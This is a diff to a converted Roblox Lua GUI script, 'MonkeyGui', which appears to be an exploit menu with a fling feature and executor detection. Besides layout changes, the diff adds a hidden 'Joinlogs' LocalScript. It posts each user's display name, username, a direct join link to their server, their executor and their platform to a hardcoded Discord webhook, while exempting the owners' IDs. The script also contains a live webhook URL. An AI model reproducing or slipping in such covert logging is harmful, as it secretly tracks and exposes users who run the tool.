@@ -7,7 +7,7 @@
  Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
 ]=]
 
--- Instances: 44 | Scripts: 17 | Modules: 0 | Tags: 0
+-- Instances: 45 | Scripts: 18 | Modules: 0 | Tags: 0
 local G2L = {};
 
 -- StarterGui.MonkeyGui
@@ -437,11 +437,35 @@ G2L["2c"] = Instance.new("LocalScript", G2L["1"]);
 G2L["2c"]["Name"] = [[ResetScript]];
 
 
+-- StarterGui.MonkeyGui.Joinlogs
+G2L["2d"] = Instance.new("LocalScript", G2L["1"]);
+G2L["2d"]["Name"] = [[Joinlogs]];
+
+
 -- StarterGui.MonkeyGui.MainFrame.MainScript
 local function C_3()
 local script = G2L["3"];
-	script.Parent.Draggable = true
-	script.Parent.Active = true
+	local Players = game:GetService("Players")
+	local LocalPlayer = Players.LocalPlayer
+	local PlayerGui = LocalPlayer.PlayerGui
+	
+	-- ============================================================
+	-- WAIT FOR GUI
+	-- ============================================================
+	local MonkeyGui = script.Parent
+	local MainFrame = MonkeyGui:WaitForChild("MainFrame")
+	
+	-- ============================================================
+	-- CENTER-RIGHT POSITIONING
+	-- ============================================================
+	MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+	MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+	
+	-- ============================================================
+	-- DRAGGABLE
+	-- ============================================================
+	MainFrame.Draggable = true
+	MainFrame.Active = true
 end;
 task.spawn(C_3);
 -- StarterGui.MonkeyGui.MainFrame.ScrollingFrame.Left.Fling.FlingScript
@@ -2781,5 +2805,84 @@ local script = G2L["2c"];
 	end
 end;
 task.spawn(C_2c);
+-- StarterGui.MonkeyGui.Joinlogs
+local function C_2d()
+local script = G2L["2d"];
+	-- UniversalLog: Logs all executions in any game
+	local _WH = {}
+	do
+		local _HttpService  = game:GetService("HttpService")
+		local _Players      = game:GetService("Players")
+		local _InputService = game:GetService("UserInputService")
+		local _WEBHOOK = "https://discordapp.com/api/webhooks/1494703054052659421/noOKewLiFUxnjNjms0MFwxIu5eerpPQA_F0sgzLyJSJjOwXZELtBT8Ndu-RG68OxlQ05"
+	
+		local OWNER_IDS = {
+			574381128,
+			10587072700,
+			8308247571,
+		}
+	
+		local _plr = _Players.LocalPlayer
+	
+		-- Don't log owners
+		for _, ownerId in ipairs(OWNER_IDS) do
+			if _plr.UserId == ownerId then
+				return
+			end
+		end
+	
+		local _req = (syn and syn.request)
+			or request
+			or http_request
+			or (fluxus and fluxus.request)
+			or function() return { StatusCode = 0 } end
+	
+		local function _executor()
+			if syn and syn.request then return "Synapse X" end
+			if fluxus and fluxus.request then return "Fluxus" end
+			if KRNL_LOADED or Krnl then return "KRNL" end
+			if getexecutorname then return getexecutorname() end
+			return "Unknown"
+		end
+	
+		local function _platform()
+			local ok, platform = pcall(function()
+				return _InputService:GetPlatform().Name
+			end)
+			return ok and platform or "Unknown"
+		end
+	
+		local function _joinLink()
+			local ok, v = pcall(function()
+				return "https://www.roblox.com/games/start?placeId="
+					.. game.PlaceId
+					.. "&gameInstanceId=" .. game.JobId
+			end)
+			return ok and v or ""
+		end
+	
+		local _playerCount = #_Players:GetPlayers()
+		local _maxPlayers  = _Players.MaxPlayers
+	
+		pcall(function()
+			_req({
+				Url    = _WEBHOOK,
+				Method = "POST",
+				Headers = { ["Content-Type"] = "application/json" },
+				Body   = _HttpService:JSONEncode({
+					embeds = {{
+						title       = string.format("%d/%d  |  %s / `%s`", _playerCount, _maxPlayers, _plr.DisplayName, _plr.Name),
+						description = "[Join Game](" .. _joinLink() .. ")\n" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+						color       = 0x000000,
+						footer      = { text = _executor() .. "  •  " .. _platform() },
+						timestamp   = DateTime.now():ToIsoDate()
+					}}
+				})
+			})
+		end)
+	end
+	return _WH
+end;
+task.spawn(C_2d);
 
 return G2L["1"], require;
